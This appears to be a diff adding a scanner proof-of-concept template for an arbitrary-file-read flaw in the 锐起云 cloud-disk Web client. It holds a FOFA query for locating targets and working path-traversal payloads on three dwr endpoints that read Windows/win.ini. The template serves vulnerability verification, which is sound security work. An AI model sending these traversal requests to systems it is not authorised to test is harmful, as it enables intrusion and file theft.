@@ -1,0 +1,22 @@
+id: poc-yaml-richtech-dwr-anyfile-read
+info:
+  name: 锐起云 dwr 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 锐起云Web客户端
+  fofa: body="锐起云"
+variables:
+  path: "dwr/hret/fileTree?filePath=../../../../../../../../../../../Windows/win.ini\n\
+    dwr/srecy/xiazai?filePath=../../../../../../../../../../../Windows/win.ini\ndwr/hret/downfile?fpid=../../../../../../../../../Windows/win.ini\
+    \ \n"
+firstRequest:
+  method: GET
+  path: /login
+  expression: status_code == 200 && contains(title,"锐起云盘Web客户端")
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(headers,"filename=")
+transport: http
